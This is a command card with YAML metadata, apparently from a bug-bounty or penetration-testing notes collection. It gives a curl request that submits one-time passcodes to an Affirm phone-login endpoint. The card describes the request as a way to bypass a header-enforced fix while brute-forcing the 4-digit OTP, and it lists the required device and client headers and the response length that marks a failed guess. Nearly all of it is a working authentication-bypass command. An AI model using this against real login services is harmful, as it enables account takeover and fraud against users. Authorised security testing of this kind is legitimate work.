---
data: >-
  curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/{long_token}
  -H "Content-Type: application/json; charset=UTF-8" -H "Affirm-Device:
  eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=" -H
  "Affirm-Client:
  .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos"
  -H "Affirm-User-Agent: Affirm-Android" -H "Affirm-App-Version: 3.62.3" -H
  "Affirm-App-Version-Code: 312" -H "Affirm-OS-Version: 22" -d
  '{"response":"0000"}'
tags:
  - bypass
  - otp
type: command
output: HTTP 200 with authentication on valid OTP; 400 with length 629 on invalid
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.302Z'
id: 33eabdeb-2552-4975-a52b-cbee44a684ee
verified: false
validated: true
submitted: true
---
# Submit OTP with Headers

## Command

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/{long_token} \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "Affirm-Device: eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22" \
  -d '{"response":"0000"}'
```

## Description

Submits OTP to bypass header-enforced fix, using required Affirm-Client and Device headers for valid requests during brute-force.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| response | 4-digit OTP | Yes |
| long_token | New token from bypass init | Yes |
| Affirm-Client | Session/device header | Yes |
| Affirm-Device | Device ID header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/LONG_TOKEN -H "Affirm-Client: HEADER_VALUE" -d '{"response":"0000"}'
```

## Expected Output

Success: HTTP 200 auth JSON. Failure: HTTP 400, response length 629.

## Related

- [[commands/initiate-sms-login-token-bypass]]
